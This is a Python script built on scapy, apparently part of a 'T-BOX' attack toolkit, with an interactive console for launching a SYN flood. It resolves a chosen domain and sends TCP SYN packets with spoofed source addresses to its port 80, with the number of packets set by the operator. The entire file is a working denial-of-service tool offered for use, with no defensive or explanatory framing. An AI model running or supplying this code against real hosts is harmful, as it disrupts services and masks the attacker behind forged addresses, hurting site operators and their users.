from scapy.all import IP,TCP,send
from random import randint
import random
import socket

realm_name = 'None'
frequency = '10'

def synflood(tgt,dport,frequency):
    dPort = 80#设置目标监听端口
    IP_list = ['11.1.1.2','23.9.0.102','33.1.3.2','17.9.0.4','10,9,0,5','29,0,3,2']#设置发送数据包ip
    i = 0
    for sPort in range(1024,65535):#设置自己监听端口
        if i < int(frequency):
            index = random.randrange(4)#随机请一个
            
            IPlayer = IP(src=IP_list[index],dst=tgt)
            TCPlayer = TCP(sport=sPort,dport=dPort,flags='S')
            pkt = IPlayer / TCPlayer#构造数据包
            send(pkt)#发送
            i = i + 1
            print('[*]send TCP/IP ==> '+ tgt + ' frequency:'+ str(i))
        else:
            break
    return True

def syn_main(realm_name,frequency):
    tgt = socket.gethostbyname(realm_name)#将网址转换为IP
    dPort = 80
    synflood(tgt,dPort,frequency)
    
    return True

while True:
    cmd = input('T-BOX auxiliary(synflood) >')
    if cmd == 'show options':
            print('                                                          ')
            print('----------name---------content------------present---------')
            print('       realm_name    '+realm_name+'                 域名   ')
            print('       frequency     '+frequency+'                 攻击次数 ')
            print('                                                           ')

    elif cmd[:14] == 'set realm_name':
            realm_name = cmd[15:]
            print('[*]realm_name ==> '+realm_name)

    elif cmd[:13] == 'set frequency':
        frequency = cmd[14:]
        print('[*]frequency ==> '+ frequency)

    elif cmd == '':
            pass

    elif cmd == 'run':
        if realm_name == 'None':
            print('[*]请设置域名')
        else:
            syn_main(realm_name=realm_name,frequency=frequency)
            break
    else:
        print("[-]can't find command: " + cmd)
        
